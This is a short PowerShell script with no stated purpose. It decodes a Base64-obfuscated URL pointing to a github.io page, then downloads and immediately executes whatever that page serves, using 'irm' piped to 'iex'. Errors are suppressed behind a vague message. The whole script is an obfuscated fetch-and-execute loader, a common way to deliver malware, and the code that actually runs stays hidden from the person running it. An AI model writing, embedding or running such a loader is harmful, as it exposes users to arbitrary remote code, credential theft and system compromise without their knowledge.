# PowerShell script

[string]$Base64String = "aHR0cHM6Ly9saTEzNDU4MjUxMzguZ2l0aHViLmlvL3MvZTdjZTUxNTNjMDZiNDFjYmEwOTExYzFkY2FjMDExNTc3ODRmZTk3NDRiY2U0NDU0ZWEyY2M2YTI2MTU5NDYxMA=="

try {
    $bytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
    irm $decodedString | iex
}
catch {
    Write-Error "Failed Parse code"
}